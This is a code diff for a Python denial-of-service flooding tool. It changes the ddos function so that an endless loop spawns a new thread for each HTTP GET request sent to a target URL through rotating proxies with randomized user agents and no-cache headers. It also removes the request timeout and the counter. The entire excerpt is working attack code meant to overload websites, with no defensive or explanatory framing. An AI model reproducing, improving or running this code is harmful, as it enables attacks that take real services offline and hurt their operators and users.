@@ -58,12 +58,9 @@ def check(ip, prox, qtime):
 
 def ddos(prox, url):
 	useragent()
-	proxies={}
-	proxies['http'] = prox
-	proxies['https'] = prox
+	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
 	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
-	i = 0
 	headers = {
 			'User-Agent': random.choice(randuser),
 			'Cache-Control': 'no-cache',
@@ -73,14 +70,18 @@ def ddos(prox, url):
 			'Connection': 'keep-alive'
 			}
 	while True:
-		try:
-			req = r.get(url, headers=headers, proxies=proxies, timeout=1)
-			if req.status_code == 200:
-				i += 1
-				if i %10 == 0:
-					print(color+"{} send {} requests...".format(prox, i))
-		except:
-			continue
+		thread_list = []
+		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
+		thread_list.append(t)
+		t.start()
+
+def start_ddos(prox, url, headers, proxies, color):
+	try:
+		req = r.get(url, headers=headers, proxies=proxies)
+		if req.status_code == 200:
+			print(color+"{} send requests...".format(prox))
+	except:
+		pass
 
 @click.command()
 @click.option('--proxy', help="File with a proxy")
